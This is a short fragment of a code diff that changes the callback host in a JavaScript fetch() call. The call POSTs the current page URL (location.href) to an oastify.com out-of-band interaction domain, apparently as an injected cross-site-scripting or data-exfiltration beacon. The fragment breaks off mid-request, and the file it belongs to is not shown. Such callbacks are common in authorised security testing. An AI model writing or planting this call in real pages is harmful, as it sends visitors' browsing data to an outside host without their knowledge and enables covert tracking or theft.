@@ -1,4 +1,4 @@
-fetch('https://d4n.nxosgoe939ibpjgfo5woxdb55wbozen3.oastify.com/', {
+fetch('https://d4n.ophbgcz2nphm7luc5sg4xvjsrjxalc91.oastify.com/', {
   method: 'POST',
   body: JSON.stringify({
     url: location.href,
